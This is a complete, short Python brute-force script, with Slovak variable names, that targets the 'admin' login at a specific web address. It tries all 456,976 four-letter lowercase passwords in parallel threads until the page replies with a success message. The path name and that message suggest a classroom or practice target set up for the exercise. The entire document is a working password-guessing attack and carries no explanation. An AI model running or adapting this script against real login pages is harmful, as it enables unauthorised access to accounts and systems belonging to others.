from concurrent.futures import ThreadPoolExecutor
import string
import requests

spravne_heslo = False


def skus(heslo):
    global spravne_heslo
    if spravne_heslo:
        return
    url = 'https://dudo.gvpt.sk/bruteforce2/index.php'
    data = {'username': 'admin', 'password': heslo}
    odpoved = requests.post(url, data=data)
    if 'uspesne si to uhadol' in odpoved.text:
        spravne_heslo = True
        print("dobre heslo: " + heslo)
    else:
        print("zle heslo: " + heslo)

if __name__ == "__main__":
    abeceda = string.ascii_lowercase
    heslo_list = [i + j + k + l for i in abeceda for j in abeceda for k in abeceda for l in abeceda]
    with ThreadPoolExecutor() as executor:
        results = executor.map(skus, heslo_list)